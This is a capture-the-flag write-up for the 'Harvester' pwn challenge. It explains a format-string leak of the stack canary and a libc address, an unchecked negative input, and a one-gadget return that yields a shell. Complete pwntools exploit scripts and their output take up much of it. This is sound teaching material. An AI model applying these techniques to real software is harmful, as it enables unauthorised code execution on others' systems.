# Harvester

The description for this challenge is as follows:

*These giant bird-looking creatures come once a day and harvest everything from our farms, leaving nothing but soil behind. We need to do something to stop them, otherwise there will be no food left for us. It will be even better instead of stopping them, tame them and take advantage of them! They seem to have some artificial implants, so if we hack them, we can take advantage of them. These creatures seem to love cherry pies for some reason..
This challenge will raise 43 euros for a good cause.*

This challenge was rated at two out of four stars. It includes elements format string leaks and a ret2libc attack.

**TL;DR Solution:** Use a format string leak to obtain the canary and a libc leak. Then use a onegadget to pop a shell.

The first step is to attempt to run the binary. I have initially gone with expected inputs; nothing immediately looks especially promising, and it indicates that we will have to look this over closely in Ghidra:

```
knittingirl@piglet:~/CTF/HTBApocalypse/harvester$ ./harvester

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 1

Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> 2

Your choice is: 2

You are not strong enough to fight yet.

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 2

You have: 10 🥧

Do you want to drop some? (y/n)
> y

How many do you want to drop?
> 4

You have: 6 🥧

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 3

You try to find its weakness, but it seems invincible..
Looking around, you see something inside a bush.
[+] You found 1 🥧!

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 4
You ran away safely!

```
The results of checksec are slightly alarming; it appears that every possible protection has been enabled:

```
knittingirl@piglet:~/CTF/HTBApocalypse/harvester$ checksec harvester
[*] '/home/knittingirl/CTF/HTBApocalypse/harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
The next step, then, is to reverse engineer this with Ghidra and look for weaknesses. We notice that each of our options is clearly labelled with a descriptive function name, which is nice. We also notice a global variable of pie, which was also referenced in our initial run of the program.

When we look at the first function, fight(), it's fairly obvious that we have a format string vulnerability when we are supposed to be selecting weapons. However, we can only input 5 characters here, so this is probably only good for leaks rather than overwrites.
```
  printstr("\n[1] 🗡\t\t[2] 💣\n[3] 🏹\t\t[4] 🔫\n> ");
                    /* Only reads in 5 chars, but they're whatver I want */
  read(0,&local_38,5);
  printstr("\nYour choice is: ");
  printf((char *)&local_38);
```
The inventory() function allows to input any integer as a number of pies that we want to drop, and it will subtract that from the current value of pie. There is no indication that negative numbers aren't allowed, so we could increase our inventory here as well as decrease it.
```
  if (local_13[0] == 'y') {
    printstr("\nHow many do you want to drop?\n> ");
    __isoc99_scanf("%d",&local_18);
    pie = pie - local_18;
```
Finally, stare() is very interesting. If we have 0x16 (22) pies in inventory, then we are able to feed in a string of 0x40 characters. It seems like this will probably allow us to do an overflow and create some sort of ROP chain.
```
  printstr("\n[+] You found 1 🥧!\n");
  pie = pie + 1;
  if (pie == 0x16) {
    printf("\x1b[1;32m");
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it?\n> ");
                    /* This could overflow ... */
    read(0,local_38,0x40);
    printf("\x1b[1;31m");
    printstr("\nThis did not work as planned..\n");
  }
                    /* The canary is a problem */
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
At this point, I over-enthusiastically created a script to see how long my overflow really was:
```
from pwn import *

target = process('./harvester', env={"LD_PRELOAD":"./libc.so.6"})

#target = remote('188.166.145.178', 31815)

pid = gdb.attach(target, "\nb *stare+212\nb *fight+176\n set disassembly-flavor intel\ncontinue")


elf = ELF("harvester")
libc = ELF("libc.so.6")

def inc_pie(amount):
	print(target.recvuntil(b'[4] Run'))
	target.sendline(b'2')
	print(target.recvuntil(b'Do you want to drop some? (y/n)'))
	target.sendline(b'y')
	print(target.recvuntil(b'How many do you want to drop?'))
	value = amount * -1
	target.sendline(str(value).encode()) 

inc_pie(11)

print(target.recvuntil(b'[4] Run'))
target.sendline(b'3')

print(target.recvuntil(b'Do you want to feed it?'))

payload = cyclic(200)

target.sendline(payload)

target.interactive()
```
And the result was:
```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/harvester$ python3 harvester_writeup.py NOPTRACE
[+] Starting local process './harvester': pid 6528
[!] Skipping debug attach since context.noptrace==True
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;36m\nA wild Harvester appeared \xf0\x9f\x90\xa6\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \nYou have: 10 \xf0\x9f\xa5\xa7\n\nDo you want to drop some? (y/n)'
b'\n> \nHow many do you want to drop?'
b'\n> \nYou have: 21 \xf0\x9f\xa5\xa7\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \x1b[1;36m\nYou try to find its weakness, but it seems invincible..\nLooking around, you see something inside a bush.\x1b[1;32m\n[+] You found 1 \xf0\x9f\xa5\xa7!\n\x1b[1;32m\nYou also notice that if the Harvester eats too many pies, it falls asleep.\nDo you want to feed it?'
[*] Switching to interactive mode

> 
This did not work as planned..
*** stack smashing detected ***: <unknown> terminated
[*] Got EOF while reading in interactive
```
We hit the canary. So, we need to return to the format string vulnerability. The fight() function also has a canary, which should be the same as that for stare(), so we should be able to obtain the value of the canary by leaking stack values. With format strings, you can leak the ith element on the stack using the format '%i$p', so we can work with our limited input length by simply iterating up on i until we hit the canary. The relevant portion of script is here:

```
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))
target.sendline(b'%11$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
canary_string = result.replace(b'\x1b[1;31m\nYou are', b'')
canary_num = int(canary_string, 16)
print('Canary is', hex(canary_num))

canary = p64(canary_num)
```
And the terminal results are:
```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/harvester$ python3 harvester_writeup.py
[+] Starting local process './harvester': pid 6605
[*] running in new terminal: /usr/bin/gdb -q  "./harvester" 6605 -x /tmp/pwnki_aykml.gdb
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;36m\nA wild Harvester appeared \xf0\x9f\x90\xa6\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \x1b[1;36m\nChoose weapon:\n\n[1] \xf0\x9f\x97\xa1\t\t[2] \xf0\x9f\x92\xa3\n[3] \xf0\x9f\x8f\xb9\t\t[4]'
b' \xf0\x9f\x94\xab\n> \nYour choice is: '
Canary is 0xcc641c72ef4f4000

```
You can confirm that it's the canary by looking at the GDB and viewing the contents for rbp-8 at an appropriate breakpoint.
```
gef➤  x/gx $rbp-8
0x7ffc6d9d2f18:	0xcc641c72ef4f4000
```
We can now send payloads by using padding that looks like:
```
padding = b'a' * 40 + canary + b'b' * 8
``` 
But we are only able to overwrite 8 bytes of the return address. Since there is no obvious win function, we should be able to make this work with a onegadget. However, we will need to leak a libc address, so we return to the format string exploit. If you iterated up from 1 to 11 on the format string, you may have noticed that %3$p appeared to be leaking a libc address. I would recommend doing this on an Ubuntu machine with the LD_PRELOAD trick in order to ensure that the libc function matches the one on the live instance. We first need to add lines onto the existing script like this:
```
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))


target.sendline(b'%3$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
libc_leak_str = result.replace(b'\n\x1b[1;31m\nYou are', b'')
libc_leak_num = int(libc_leak_str, 16)
```
Since we are given the libc version, it's a good idea to run it against both the local version and the live instance to confirm that the offsets are the same. Now we need to run it against the local version with GDB and look at the contents of the leaked address:
```
gef➤  x/2wx 0x7fd08f8ab774
0x7fd08f8ab774 <nanosleep+20>:	0xf0003d48	0x4477ffff
```
So, if we subtract 20 from our leak, we have the libc address of the nanosleep function. We can use this to derive the libc base and successfully call the onegadget. The final exploit script is here:
```
from pwn import *

#target = process('./harvester', env={"LD_PRELOAD":"./libc.so.6"})

target = remote('188.166.145.178', 31815)

#pid = gdb.attach(target, "\nb *stare+212\nb *fight+176\n set disassembly-flavor intel\ncontinue")


elf = ELF("harvester")
libc = ELF("libc.so.6")

#Gadgets:

onegadget_offset = 0x4f3d5

def inc_pie(amount):
	print(target.recvuntil(b'[4] Run'))
	target.sendline(b'2')
	print(target.recvuntil(b'Do you want to drop some? (y/n)'))
	target.sendline(b'y')
	print(target.recvuntil(b'How many do you want to drop?'))
	value = amount * -1
	target.sendline(str(value).encode()) 

#Leak the canary
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))
target.sendline(b'%11$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
canary_string = result.replace(b'\x1b[1;31m\nYou are', b'')
canary_num = int(canary_string, 16)
print('Canary is', hex(canary_num))

canary = p64(canary_num)

#libc leak:
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))

target.sendline(b'%3$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
libc_leak_str = result.replace(b'\n\x1b[1;31m\nYou are', b'')
libc_leak_num = int(libc_leak_str, 16)
nanosleep_libc = libc_leak_num - 20
print('nanosleep_libc', hex(nanosleep_libc))
print(libc.symbols['nanosleep'])

libc_base = nanosleep_libc - libc.symbols['nanosleep']
onegadget = libc_base + onegadget_offset

#Now trigger the increase in pie.
inc_pie(11)

print(target.recvuntil(b'[4] Run'))
target.sendline(b'3')

print(target.recvuntil(b'Do you want to feed it?'))

padding = b'a' * 40 + canary + b'b' * 8
payload = padding

payload += p64(onegadget)

target.sendline(payload)

target.interactive()
```
And the output should look like this:
```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/harvester$ python3 harvester_payload.py 
[+] Opening connection to 188.166.145.178 on port 31815: Done
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/ubuntu/CTF/HTBApocalypse/harvester/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;36m\nA wild Harvester appeared \xf0\x9f\x90\xa6\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \x1b[1;36m\nChoose weapon:\n\n[1] \xf0\x9f\x97\xa1\t\t[2] \xf0\x9f\x92\xa3\n[3] \xf0\x9f\x8f\xb9\t\t[4]'
b' \xf0\x9f\x94\xab\n> \nYour choice is: '
Canary is 0xeb2c0f2ad8544400
b' not strong enough to fight yet.\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \x1b[1;36m\nChoose weapon:\n\n[1] \xf0\x9f\x97\xa1\t\t[2] \xf0\x9f\x92\xa3\n[3] \xf0\x9f\x8f\xb9\t\t[4]'
b' \xf0\x9f\x94\xab\n> \nYour choice is: '
nanosleep_libc 0x7f08152cc760
935776
b' not strong enough to fight yet.\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \nYou have: 10 \xf0\x9f\xa5\xa7\n\nDo you want to drop some? (y/n)'
b'\n> \nHow many do you want to drop?'
b'\n> \nYou have: 21 \xf0\x9f\xa5\xa7\n\x1b[1;31m\x1b[1;32m\nOptions:\n\n[1] Fight \xf0\x9f\x91\x8a\t[2] Inventory \xf0\x9f\x8e\x92\n[3] Stare \xf0\x9f\x91\x80\t[4] Run'
b' \xf0\x9f\x8f\x83\n> \x1b[1;36m\nYou try to find its weakness, but it seems invincible..\nLooking around, you see something inside a bush.\x1b[1;32m\n[+] You found 1 \xf0\x9f\xa5\xa7!\n\x1b[1;32m\nYou also notice that if the Harvester eats too many pies, it falls asleep.\nDo you want to feed it?'
[*] Switching to interactive mode

> 
This did not work as planned..
$ whoami
ctf
$ ls
flag.txt  harvester  libc.so.6
$ cat flag.txt
CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
```
